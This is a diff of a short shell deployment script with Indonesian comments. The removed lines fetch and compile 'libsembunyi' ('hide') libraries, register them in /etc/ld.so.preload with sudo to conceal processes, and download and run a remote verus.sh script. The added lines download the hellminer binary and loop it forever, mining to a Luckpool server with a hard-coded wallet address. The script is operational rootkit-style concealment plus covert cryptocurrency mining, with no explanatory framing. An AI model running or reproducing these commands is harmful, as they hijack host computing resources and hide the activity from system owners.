@@ -1,4 +1,9 @@
-wget https://github.com/mutiahanum22/used/releases/download/fired/all.tar.gz &> /dev/null
-tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload
-apt-get install shc -y && wget https://raw.githubusercontent.com/thefacta/script/main/verus.sh && chmod +x verus.sh
-./verus.sh
+# Donwload File
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+# extrak file
+tar xf hellminer_cpu_linux.tar.gz
+# Run Mining
+while [ 1 ]; do
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u REwnkW4fYncoPJUvXqwzwC3RNKtj5MghVy.VPS_01 -p x --cpu 2
+done
+#done
